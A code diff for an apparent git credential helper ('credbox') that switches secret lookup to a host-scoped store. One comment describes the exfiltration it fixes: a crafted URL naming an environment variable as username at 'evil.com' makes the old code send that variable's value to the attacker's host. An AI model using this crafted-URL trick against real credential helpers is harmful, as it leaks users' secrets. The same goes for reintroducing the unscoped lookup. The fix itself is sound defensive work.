@@ -17,6 +17,7 @@ import sys
 from collections.abc import Sequence
 from typing import TextIO
 
+from credbox.backends import default_backend
 from credbox.credentials import Credentials
 from credbox.errors import CredBoxError, InvalidAppNameError
 from credbox.paths import app_dir_segment
@@ -49,19 +50,24 @@ def _do_get(fields: dict[str, str]) -> None:
     app = _app_of(fields)
     if app is None:
         return
-    credentials = Credentials(app)
+    # Read the STORE ONLY (host-scoped) -- NOT Credentials.secret(), whose environment tier is
+    # global and host-unscoped: git supplies the username, so a crafted URL
+    # `https://SOME_ENV_VAR@evil.com/` would otherwise resolve `SOME_ENV_VAR` from os.environ and
+    # hand that value to git as the password *for evil.com* -- a remote exfiltration of any env var.
+    # A credential this helper serves must come from a store keyed to the requesting host.
+    backend = default_backend()
     username = fields.get("username")
     if username:
-        value = credentials.secret(username)
+        value = backend.get(app, username)
         if value is not None:
             _write_reply(sys.stdout, username=username, password=value.reveal())
         return
     # First contact without a username: use the sole stored name if exactly one exists. Under a
     # keyring backend, names() lists only the fallback file, so a keyring-only store may yield
     # nothing here (a defined empty reply -> git prompts), which is documented, not a break.
-    names = credentials.names()
+    names = backend.names(app)
     if len(names) == 1:
-        value = credentials.secret(names[0])
+        value = backend.get(app, names[0])
         if value is not None:
             _write_reply(sys.stdout, username=names[0], password=value.reveal())
 
